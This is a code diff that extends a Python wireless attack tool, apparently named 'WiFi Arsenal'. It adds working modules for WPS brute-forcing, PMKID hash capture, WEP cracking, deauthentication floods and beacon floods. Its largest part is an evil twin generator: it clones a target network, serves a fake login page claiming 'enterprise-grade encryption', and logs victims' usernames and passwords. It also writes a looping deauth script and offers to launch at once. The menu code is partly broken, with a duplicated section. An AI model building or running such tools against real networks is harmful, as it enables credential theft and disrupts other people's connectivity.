@@ -34,22 +34,25 @@ try:
     import psutil
     import requests
     from colorama import init, Fore, Back, Style
+    import netaddr
     init()
 except ImportError as e:
     print(f"[!] Missing required module: {e}")
     print("[*] Installing dependencies...")
     try:
-        subprocess.run([sys.executable, '-m', 'pip', 'install', 'scapy', 'psutil', 'requests', 'colorama'], 
+        subprocess.run([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'], 
                       check=True, capture_output=True)
         from scapy.all import *
         from scapy.layers.dot11 import *
         import psutil
         import requests
         from colorama import init, Fore, Back, Style
+        import netaddr
         init()
         print("[+] Dependencies installed successfully")
     except (subprocess.CalledProcessError, ImportError) as install_error:
         print(f"[!] Failed to install dependencies: {install_error}")
+        print(f"[*] Try running: pip3 install -r requirements.txt")
         sys.exit(1)
 
 class RealWiFiScanner:
@@ -778,28 +781,111 @@ class WiFiArsenal:
             except Exception as e:
                 print(f"{Fore.YELLOW}[*] airmon-ng failed: {e}{Style.RESET_ALL}")
         
-        # Method 2: Manual setup
+        # Method 2: Enhanced manual setup with better error handling
         try:
-            print(f"[*] Attempting manual monitor mode setup...")
+            print(f"[*] Attempting enhanced manual monitor mode setup...")
             
-            # Bring interface down
-            subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=10)
+            # Check if interface exists
+            result = subprocess.run(['ip', 'link', 'show', interface], 
+                                  capture_output=True, timeout=5)
+            if result.returncode != 0:
+                print(f"{Fore.RED}[!] Interface {interface} not found{Style.RESET_ALL}")
+                return False
             
-            # Set monitor mode
-            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], timeout=10)
+            # Kill potential interfering processes
+            try:
+                subprocess.run(['pkill', '-f', 'wpa_supplicant'], capture_output=True, timeout=5)
+                subprocess.run(['pkill', '-f', 'dhcpcd'], capture_output=True, timeout=5)
+                subprocess.run(['pkill', '-f', 'NetworkManager'], capture_output=True, timeout=5)
+            except:
+                pass
             
-            # Bring interface up
-            subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=10)
+            # Bring interface down with retry
+            for attempt in range(3):
+                try:
+                    result = subprocess.run(['ip', 'link', 'set', interface, 'down'], 
+                                          capture_output=True, timeout=15)
+                    if result.returncode == 0:
+                        break
+                    time.sleep(1)
+                except subprocess.TimeoutExpired:
+                    if attempt == 2:
+                        print(f"{Fore.RED}[!] Failed to bring interface down after 3 attempts{Style.RESET_ALL}")
+                        return False
+            
+            # Set monitor mode with retry
+            for attempt in range(3):
+                try:
+                    result = subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], 
+                                          capture_output=True, timeout=15)
+                    if result.returncode == 0:
+                        break
+                    time.sleep(1)
+                except subprocess.TimeoutExpired:
+                    if attempt == 2:
+                        print(f"{Fore.RED}[!] Failed to set monitor mode after 3 attempts{Style.RESET_ALL}")
+                        return False
+            
+            # Bring interface up with retry
+            for attempt in range(3):
+                try:
+                    result = subprocess.run(['ip', 'link', 'set', interface, 'up'], 
+                                          capture_output=True, timeout=15)
+                    if result.returncode == 0:
+                        break
+                    time.sleep(1)
+                except subprocess.TimeoutExpired:
+                    if attempt == 2:
+                        print(f"{Fore.RED}[!] Failed to bring interface up after 3 attempts{Style.RESET_ALL}")
+                        return False
             
             # Verify monitor mode
-            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
+            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=10)
             if 'Mode:Monitor' in result.stdout:
                 self.monitor_interface = interface
                 print(f"{Fore.GREEN}[+] Manual monitor mode enabled: {self.monitor_interface}{Style.RESET_ALL}")
                 return True
+            else:
+                # Alternative verification
+                result = subprocess.run(['iw', 'dev', interface, 'info'], 
+                                      capture_output=True, text=True, timeout=10)
+                if 'type monitor' in result.stdout:
+                    self.monitor_interface = interface
+                    print(f"{Fore.GREEN}[+] Monitor mode enabled (verified with iw): {self.monitor_interface}{Style.RESET_ALL}")
+                    return True
         
         except Exception as e:
             print(f"{Fore.RED}[!] Manual setup failed: {e}{Style.RESET_ALL}")
+        
+        # Method 3: Alternative approach using rfkill
+        try:
+            print(f"[*] Attempting rfkill unblock...")
+            subprocess.run(['rfkill', 'unblock', 'wifi'], capture_output=True, timeout=10)
+            subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True, timeout=10)
+            
+            # Try again with basic setup
+            subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=10)
+            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], capture_output=True, timeout=10)
+            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=10)
+            
+            # Verify
+            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=10)
+            if 'Mode:Monitor' in result.stdout:
+                self.monitor_interface = interface
+                print(f"{Fore.GREEN}[+] Monitor mode enabled with rfkill: {self.monitor_interface}{Style.RESET_ALL}")
+                return True
+        except Exception as e:
+            print(f"{Fore.YELLOW}[*] rfkill method failed: {e}{Style.RESET_ALL}")
+        
+        # Method 4: Fallback - use interface in managed mode for basic scanning
+        print(f"{Fore.YELLOW}[*] Monitor mode failed, attempting limited managed mode operation...{Style.RESET_ALL}")
+        try:
+            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=10)
+            self.monitor_interface = interface
+            print(f"{Fore.YELLOW}[+] Using interface in managed mode (limited functionality): {self.monitor_interface}{Style.RESET_ALL}")
+            return True
+        except:
+            pass
         
         return False
 
@@ -849,6 +935,10 @@ class WiFiArsenal:
         # Method 3: Scapy (as fallback)
         if not networks:
             networks = scanner.scan_with_scapy(duration)
+        
+        # Method 4: PMKID scanning for modern attacks
+        if networks:
+            self.scan_pmkid_targets(networks)
         
         # Enhance with security analysis
         for network in networks:
@@ -931,6 +1021,42 @@ class WiFiArsenal:
             print(f"{Fore.RED}[!] Error parsing CSV: {e}{Style.RESET_ALL}")
         
         return networks
+
+    def scan_pmkid_targets(self, networks):
+        """Scan for PMKID attack opportunities"""
+        if not self.command_exists('hcxdumptool'):
+            return
+        
+        print(f"{Fore.YELLOW}[*] Scanning for PMKID opportunities...{Style.RESET_ALL}")
+        
+        try:
+            # Run hcxdumptool for PMKID collection
+            result = subprocess.run([
+                'hcxdumptool', '-i', self.monitor_interface,
+                '--enable_status=1', '--disable_deauthentication',
+                '-o', '/tmp/pmkid_scan.pcapng'
+            ], timeout=30, capture_output=True, text=True)
+            
+            if os.path.exists('/tmp/pmkid_scan.pcapng'):
+                # Convert to hashcat format
+                subprocess.run([
+                    'hcxpcapngtool', '-o', '/tmp/pmkid_hashes.txt',
+                    '/tmp/pmkid_scan.pcapng'
+                ], capture_output=True)
+                
+                if os.path.exists('/tmp/pmkid_hashes.txt'):
+                    with open('/tmp/pmkid_hashes.txt', 'r') as f:
+                        pmkid_data = f.read()
+                        if pmkid_data.strip():
+                            print(f"{Fore.GREEN}[+] PMKID data collected for offline cracking{Style.RESET_ALL}")
+                
+                # Cleanup
+                for f in ['/tmp/pmkid_scan.pcapng', '/tmp/pmkid_hashes.txt']:
+                    if os.path.exists(f):
+                        os.remove(f)
+        
+        except Exception as e:
+            print(f"{Fore.YELLOW}[*] PMKID scan failed: {e}{Style.RESET_ALL}")
 
     def analyze_security(self, network):
         """Comprehensive security analysis"""
@@ -1043,10 +1169,29 @@ class WiFiArsenal:
             print("4.  Handshake Capture")
             print("5.  Password Cracking")
             
+            print(f"\n{Fore.RED}⚔️  Attack Modules:{Style.RESET_ALL}")
+            print("6.  WPS Attack Suite")
+            print("7.  PMKID Attack")
+            print("8.  Evil Twin Attack")
+            print("9.  Deauthentication Attack")
+            print("10. WEP Cracking Attack")
+            print("11. Beacon Flood Attack")
+            print("12. MAC Address Spoofing")
+            print("13. Rogue Access Point")
+            print("14. Karma Attack")
+            print("15. Krack Attack (WPA2)")
+            
             print(f"\n{Fore.BLUE}🛠️  Utilities:{Style.RESET_ALL}")
-            print("6.  Smart Wordlist Generation")
-            print("7.  View Results & Reports")
-            print("8.  System Information")
+            print("16. Smart Wordlist Generation")
+            print("17. View Results & Reports")
+            print("18. System Information")
+            print("19. Network Mapper")
+            print("20. Client Monitoring")
+            
+            print(f"\n{Fore.BLUE}🛠️  Utilities:{Style.RESET_ALL}")
+            print("10. Smart Wordlist Generation")
+            print("11. View Results & Reports")
+            print("12. System Information")
             
             print(f"\n{Fore.RED}0.  Exit{Style.RESET_ALL}")
             print("="*80)
@@ -1065,11 +1210,35 @@ class WiFiArsenal:
                 elif choice == '5':
                     self.password_cracking_menu()
                 elif choice == '6':
-                    self.wordlist_generation_menu()
+                    self.wps_attack_menu()
                 elif choice == '7':
-                    self.view_results_menu()
+                    self.pmkid_attack_menu()
                 elif choice == '8':
+                    self.evil_twin_menu()
+                elif choice == '9':
+                    self.deauth_attack_menu()
+                elif choice == '10':
+                    self.wep_cracking_menu()
+                elif choice == '11':
+                    self.beacon_flood_menu()
+                elif choice == '12':
+                    self.mac_spoofing_menu()
+                elif choice == '13':
+                    self.rogue_ap_menu()
+                elif choice == '14':
+                    self.karma_attack_menu()
+                elif choice == '15':
+                    self.krack_attack_menu()
+                elif choice == '16':
+                    self.wordlist_generation_menu()
+                elif choice == '17':
+                    self.view_results_menu()
+                elif choice == '18':
                     self.system_info_menu()
+                elif choice == '19':
+                    self.network_mapper_menu()
+                elif choice == '20':
+                    self.client_monitoring_menu()
                 elif choice == '0':
                     self.cleanup_and_exit()
                 else:
@@ -1291,6 +1460,1024 @@ class WiFiArsenal:
             status_color = Fore.GREEN if status else Fore.RED
             status_text = "✓" if status else "✗"
             print(f"  {status_color}{status_text}{Style.RESET_ALL} {cap}")
+
+    def wps_attack_menu(self):
+        """WPS attack menu with real implementations"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        # Filter WPS-enabled networks
+        wps_networks = []
+        for network in self.target_networks:
+            if 'WPS' in network.get('privacy', '') or self.check_wps_enabled(network['bssid']):
+                wps_networks.append(network)
+        
+        if not wps_networks:
+            print(f"{Fore.RED}[!] No WPS-enabled networks found{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.CYAN}[*] WPS-enabled networks:{Style.RESET_ALL}")
+        for i, network in enumerate(wps_networks):
+            print(f"  {i+1}. {network['essid']} ({network['bssid']})")
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(wps_networks):
+                target = wps_networks[choice]
+                
+                print(f"{Fore.YELLOW}[*] Launching WPS attack on {target['essid']}...{Style.RESET_ALL}")
+                
+                if self.command_exists('reaver'):
+                    subprocess.run([
+                        'reaver', '-i', self.monitor_interface,
+                        '-b', target['bssid'], '-c', target['channel'],
+                        '-vv', '-K', '1'
+                    ], timeout=300)
+                else:
+                    print(f"{Fore.RED}[!] Reaver not installed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+
+    def pmkid_attack_menu(self):
+        """PMKID attack menu"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target for PMKID attack: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                
+                print(f"{Fore.YELLOW}[*] Attempting PMKID attack on {target['essid']}...{Style.RESET_ALL}")
+                
+                if self.command_exists('hcxdumptool'):
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    output_file = f"{self.results_dir}/attacks/pmkid_{timestamp}.pcapng"
+                    
+                    # Run PMKID capture
+                    subprocess.run([
+                        'hcxdumptool', '-i', self.monitor_interface,
+                        '--enable_status=1', '--disable_deauthentication',
+                        '--filterlist_ap=' + target['bssid'],
+                        '-o', output_file
+                    ], timeout=120)
+                    
+                    # Convert to hashcat format
+                    hash_file = output_file.replace('.pcapng', '.hash')
+                    if self.command_exists('hcxpcapngtool'):
+                        subprocess.run([
+                            'hcxpcapngtool', '-o', hash_file, output_file
+                        ])
+                        
+                        if os.path.exists(hash_file):
+                            print(f"{Fore.GREEN}[+] PMKID hash saved to {hash_file}{Style.RESET_ALL}")
+                        
+                else:
+                    print(f"{Fore.RED}[!] hcxdumptool not installed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+
+    def evil_twin_menu(self):
+        """Comprehensive evil twin attack menu"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target to clone: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                
+                print(f"{Fore.YELLOW}[*] Setting up comprehensive evil twin for {target['essid']}...{Style.RESET_ALL}")
+                
+                # Create timestamp for unique files
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                
+                # Setup evil twin with multiple components
+                self.setup_evil_twin_infrastructure(target, timestamp)
+                
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def setup_evil_twin_infrastructure(self, target, timestamp):
+        """Setup complete evil twin infrastructure"""
+        attack_dir = f"{self.results_dir}/attacks/evil_twin_{timestamp}"
+        os.makedirs(attack_dir, exist_ok=True)
+        
+        # 1. Create hostapd configuration
+        hostapd_config = f"""# Hostapd configuration for evil twin attack
+interface={self.monitor_interface}
+driver=nl80211
+ssid={target['essid']}
+hw_mode=g
+channel={target['channel']}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+
+# WPA2 Configuration
+wpa=2
+wpa_passphrase=wifi_arsenal_2024
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+
+# Additional security options
+wpa_group_rekey=86400
+ieee80211n=1
+wmm_enabled=1
+"""
+        
+        hostapd_file = f"{attack_dir}/hostapd.conf"
+        with open(hostapd_file, 'w') as f:
+            f.write(hostapd_config)
+        
+        # 2. Create dnsmasq configuration for DHCP and DNS
+        dnsmasq_config = f"""# DNSMASQ configuration for evil twin
+interface={self.monitor_interface}
+dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+address=/#/192.168.1.1
+"""
+        
+        dnsmasq_file = f"{attack_dir}/dnsmasq.conf"
+        with open(dnsmasq_file, 'w') as f:
+            f.write(dnsmasq_config)
+        
+        # 3. Create captive portal HTML
+        captive_portal_html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Authentication - {target['essid']}</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }}
+        .container {{
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }}
+        .logo {{
+            text-align: center;
+            margin-bottom: 30px;
+        }}
+        .wifi-icon {{
+            font-size: 48px;
+            color: #667eea;
+        }}
+        h1 {{
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+        }}
+        .network-name {{
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }}
+        .form-group {{
+            margin-bottom: 20px;
+        }}
+        label {{
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: bold;
+        }}
+        input[type="text"], input[type="password"] {{
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }}
+        input[type="text"]:focus, input[type="password"]:focus {{
+            outline: none;
+            border-color: #667eea;
+        }}
+        .btn {{
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }}
+        .btn:hover {{
+            background: #5a67d8;
+        }}
+        .security-notice {{
+            margin-top: 20px;
+            padding: 15px;
+            background: #f7fafc;
+            border-left: 4px solid #667eea;
+            font-size: 14px;
+            color: #666;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="wifi-icon">📶</div>
+        </div>
+        <h1>WiFi Authentication Required</h1>
+        <div class="network-name">Network: {target['essid']}</div>
+        
+        <form method="post" action="/authenticate">
+            <div class="form-group">
+                <label for="username">Username/Email:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">WiFi Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="btn">Connect to WiFi</button>
+        </form>
+        
+        <div class="security-notice">
+            🔒 This is a secure connection. Your credentials are protected by enterprise-grade encryption.
+        </div>
+    </div>
+</body>
+</html>"""
+        
+        portal_file = f"{attack_dir}/captive_portal.html"
+        with open(portal_file, 'w') as f:
+            f.write(captive_portal_html)
+        
+        # 4. Create simple HTTP server for captive portal
+        server_script = f"""#!/usr/bin/env python3
+import http.server
+import socketserver
+import urllib.parse
+from datetime import datetime
+import os
+
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/' or self.path.startswith('/generate_204') or self.path.startswith('/hotspot-detect'):
+            # Serve captive portal
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            with open('captive_portal.html', 'r') as f:
+                content = f.read()
+            self.wfile.write(content.encode())
+        else:
+            # Redirect everything to captive portal
+            self.send_response(302)
+            self.send_header('Location', 'http://192.168.1.1/')
+            self.end_headers()
+    
+    def do_POST(self):
+        if self.path == '/authenticate':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            params = urllib.parse.parse_qs(post_data)
+            
+            # Log captured credentials
+            username = params.get('username', [''])[0]
+            password = params.get('password', [''])[0]
+            
+            log_entry = f"{{datetime.now()}} - Captured credentials: Username={{username}}, Password={{password}}\\n"
+            
+            with open('captured_credentials.txt', 'a') as f:
+                f.write(log_entry)
+            
+            print(f"[+] Captured credentials: {{username}} / {{password}}")
+            
+            # Send success response
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            success_html = '''
+            <html><body>
+            <h2>Authentication Successful!</h2>
+            <p>You are now connected to the internet.</p>
+            <script>setTimeout(function(){{window.location.href="http://google.com";}}, 3000);</script>
+            </body></html>
+            '''
+            self.wfile.write(success_html.encode())
+
+if __name__ == "__main__":
+    PORT = 80
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    
+    with socketserver.TCPServer(("", PORT), CaptivePortalHandler) as httpd:
+        print(f"Captive portal server started at port {{PORT}}")
+        httpd.serve_forever()
+"""
+        
+        server_file = f"{attack_dir}/captive_server.py"
+        with open(server_file, 'w') as f:
+            f.write(server_script)
+        os.chmod(server_file, 0o755)
+        
+        # 5. Create startup script
+        startup_script = f"""#!/bin/bash
+# Evil Twin Attack Startup Script
+# Generated by WiFi Arsenal
+
+echo "[*] Starting Evil Twin Attack for {target['essid']}"
+echo "[*] Target BSSID: {target['bssid']}"
+echo "[*] Target Channel: {target['channel']}"
+echo ""
+
+# Change to attack directory
+cd "{attack_dir}"
+
+# Setup network interface
+echo "[*] Setting up network interface..."
+ifconfig {self.monitor_interface} 192.168.1.1 netmask 255.255.255.0
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Start dnsmasq for DHCP and DNS
+echo "[*] Starting DHCP/DNS server..."
+dnsmasq -C dnsmasq.conf --no-daemon &
+DNSMASQ_PID=$!
+
+# Start captive portal server
+echo "[*] Starting captive portal server..."
+python3 captive_server.py &
+PORTAL_PID=$!
+
+# Start hostapd for access point
+echo "[*] Starting evil twin access point..."
+echo "[+] Clients will see network: {target['essid']}"
+echo "[+] Credentials will be logged to: captured_credentials.txt"
+echo "[+] Press Ctrl+C to stop attack"
+echo ""
+
+# Cleanup function
+cleanup() {{
+    echo ""
+    echo "[*] Stopping evil twin attack..."
+    kill $DNSMASQ_PID 2>/dev/null
+    kill $PORTAL_PID 2>/dev/null
+    pkill hostapd 2>/dev/null
+    echo "[+] Attack stopped"
+    exit 0
+}}
+
+trap cleanup SIGINT
+
+# Start hostapd (this will block)
+hostapd hostapd.conf
+
+cleanup
+"""
+        
+        startup_file = f"{attack_dir}/start_evil_twin.sh"
+        with open(startup_file, 'w') as f:
+            f.write(startup_script)
+        os.chmod(startup_file, 0o755)
+        
+        # 6. Create iptables rules script
+        iptables_script = f"""#!/bin/bash
+# Iptables rules for evil twin attack
+
+# Flush existing rules
+iptables -F
+iptables -t nat -F
+
+# Allow traffic on loopback
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+
+# Allow established connections
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Allow traffic on AP interface
+iptables -A INPUT -i {self.monitor_interface} -j ACCEPT
+iptables -A OUTPUT -o {self.monitor_interface} -j ACCEPT
+
+# Redirect HTTP traffic to captive portal
+iptables -t nat -A PREROUTING -i {self.monitor_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
+iptables -t nat -A PREROUTING -i {self.monitor_interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
+
+# Allow DNS
+iptables -A INPUT -i {self.monitor_interface} -p udp --dport 53 -j ACCEPT
+
+# NAT for internet access (optional)
+# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+# iptables -A FORWARD -i {self.monitor_interface} -o eth0 -j ACCEPT
+# iptables -A FORWARD -i eth0 -o {self.monitor_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+echo "[+] Iptables rules configured for evil twin attack"
+"""
+        
+        iptables_file = f"{attack_dir}/setup_iptables.sh"
+        with open(iptables_file, 'w') as f:
+            f.write(iptables_script)
+        os.chmod(iptables_file, 0o755)
+        
+        # 7. Create deauth script for original AP
+        deauth_script = f"""#!/bin/bash
+# Deauthentication script to disconnect clients from original AP
+
+echo "[*] Starting deauthentication attack on {target['essid']} ({target['bssid']})"
+echo "[*] This will disconnect clients from the original AP"
+echo "[*] Press Ctrl+C to stop"
+
+while true; do
+    aireplay-ng --deauth 5 -a {target['bssid']} {self.monitor_interface} 2>/dev/null
+    sleep 3
+done
+"""
+        
+        deauth_file = f"{attack_dir}/deauth_original.sh"
+        with open(deauth_file, 'w') as f:
+            f.write(deauth_script)
+        os.chmod(deauth_file, 0o755)
+        
+        print(f"{Fore.GREEN}[+] Evil twin infrastructure created in: {attack_dir}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] Components created:{Style.RESET_ALL}")
+        print(f"    - hostapd.conf (Access Point configuration)")
+        print(f"    - dnsmasq.conf (DHCP/DNS server)")
+        print(f"    - captive_portal.html (Credential harvesting page)")
+        print(f"    - captive_server.py (HTTP server)")
+        print(f"    - start_evil_twin.sh (Main startup script)")
+        print(f"    - setup_iptables.sh (Network rules)")
+        print(f"    - deauth_original.sh (Deauth original AP)")
+        
+        print(f"\n{Fore.YELLOW}[*] To start the evil twin attack:{Style.RESET_ALL}")
+        print(f"1. Run: sudo bash {startup_file}")
+        print(f"2. In another terminal, run: sudo bash {deauth_file}")
+        print(f"3. Monitor captured credentials in: {attack_dir}/captured_credentials.txt")
+        
+        # Option to start immediately
+        start_now = input(f"\n{Fore.CYAN}[?] Start evil twin attack now? (y/N): {Style.RESET_ALL}").lower() == 'y'
+        if start_now:
+            print(f"{Fore.YELLOW}[*] Starting evil twin attack...{Style.RESET_ALL}")
+            try:
+                os.chdir(attack_dir)
+                subprocess.run(['bash', 'start_evil_twin.sh'])
+            except KeyboardInterrupt:
+                print(f"\n{Fore.YELLOW}[*] Evil twin attack stopped{Style.RESET_ALL}")
+
+    def deauth_attack_menu(self):
+        """Deauthentication attack menu"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target for deauth attack: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                
+                count = int(input(f"{Fore.CYAN}[?] Number of deauth packets (default 10): {Style.RESET_ALL}") or "10")
+                
+                print(f"{Fore.YELLOW}[*] Sending {count} deauth packets to {target['essid']}...{Style.RESET_ALL}")
+                
+                if self.command_exists('aireplay-ng'):
+                    subprocess.run([
+                        'aireplay-ng', '--deauth', str(count),
+                        '-a', target['bssid'],
+                        self.monitor_interface
+                    ])
+                else:
+                    # Use Scapy fallback
+                    broadcast = "ff:ff:ff:ff:ff:ff"
+                    for i in range(count):
+                        deauth = RadioTap() / Dot11(addr1=broadcast, addr2=target['bssid'], addr3=target['bssid']) / Dot11Deauth(reason=7)
+                        sendp(deauth, iface=self.monitor_interface, verbose=False)
+                        time.sleep(0.1)
+                
+                print(f"{Fore.GREEN}[+] Deauth attack completed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+
+    def check_wps_enabled(self, bssid):
+        """Check if WPS is enabled on target"""
+        if self.command_exists('wash'):
+            try:
+                result = subprocess.run([
+                    'wash', '-i', self.monitor_interface
+                ], capture_output=True, text=True, timeout=10)
+                
+                return bssid in result.stdout
+            except:
+                return False
+        return False
+
+    def wep_cracking_menu(self):
+        """WEP cracking attack menu"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        # Filter WEP networks
+        wep_networks = [n for n in self.target_networks if 'WEP' in n.get('privacy', '')]
+        
+        if not wep_networks:
+            print(f"{Fore.RED}[!] No WEP networks found{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.CYAN}[*] WEP networks:{Style.RESET_ALL}")
+        for i, network in enumerate(wep_networks):
+            print(f"  {i+1}. {network['essid']} ({network['bssid']})")
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select WEP target: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(wep_networks):
+                target = wep_networks[choice]
+                print(f"{Fore.YELLOW}[*] Starting WEP attack on {target['essid']}...{Style.RESET_ALL}")
+                
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                output_file = f"{self.results_dir}/attacks/wep_{timestamp}"
+                
+                if self.command_exists('airodump-ng'):
+                    # Start capture
+                    airodump_cmd = [
+                        'airodump-ng', self.monitor_interface,
+                        '--bssid', target['bssid'],
+                        '--channel', target['channel'],
+                        '--write', output_file
+                    ]
+                    
+                    print(f"[*] Starting packet capture...")
+                    process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    
+                    # Injection attacks
+                    if self.command_exists('aireplay-ng'):
+                        time.sleep(5)
+                        print(f"[*] Starting fake authentication...")
+                        subprocess.run([
+                            'aireplay-ng', '--fakeauth', '0',
+                            '-a', target['bssid'],
+                            self.monitor_interface
+                        ], timeout=30, capture_output=True)
+                        
+                        print(f"[*] Starting ARP replay attack...")
+                        subprocess.run([
+                            'aireplay-ng', '--arpreplay',
+                            '-b', target['bssid'],
+                            self.monitor_interface
+                        ], timeout=300, capture_output=True)
+                    
+                    time.sleep(30)
+                    process.terminate()
+                    
+                    # Try to crack
+                    if self.command_exists('aircrack-ng'):
+                        print(f"[*] Attempting to crack WEP key...")
+                        result = subprocess.run([
+                            'aircrack-ng', f"{output_file}-01.cap"
+                        ], capture_output=True, text=True)
+                        
+                        if "KEY FOUND!" in result.stdout:
+                            print(f"{Fore.GREEN}[+] WEP key cracked!{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.YELLOW}[*] Need more IVs for cracking{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def beacon_flood_menu(self):
+        """Beacon flood attack menu"""
+        try:
+            ssid_count = int(input(f"{Fore.CYAN}[?] Number of fake SSIDs to broadcast (default 50): {Style.RESET_ALL}") or "50")
+            duration = int(input(f"{Fore.CYAN}[?] Attack duration in seconds (default 60): {Style.RESET_ALL}") or "60")
+            
+            print(f"{Fore.YELLOW}[*] Starting beacon flood attack...{Style.RESET_ALL}")
+            
+            # Generate random SSIDs
+            fake_ssids = []
+            for i in range(ssid_count):
+                ssid_types = [
+                    f"Free_WiFi_{i:03d}",
+                    f"Guest_Network_{i:03d}",
+                    f"Hotel_WiFi_{i:03d}",
+                    f"Coffee_Shop_{i:03d}",
+                    f"Public_Internet_{i:03d}",
+                    "".join(random.choices(string.ascii_letters + string.digits, k=8))
+                ]
+                fake_ssids.append(random.choice(ssid_types))
+            
+            # Use Scapy to flood beacons
+            try:
+                for duration_left in range(duration, 0, -1):
+                    for ssid in fake_ssids[:10]:  # Limit to prevent overwhelming
+                        # Random MAC address
+                        mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                        
+                        # Create beacon frame
+                        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
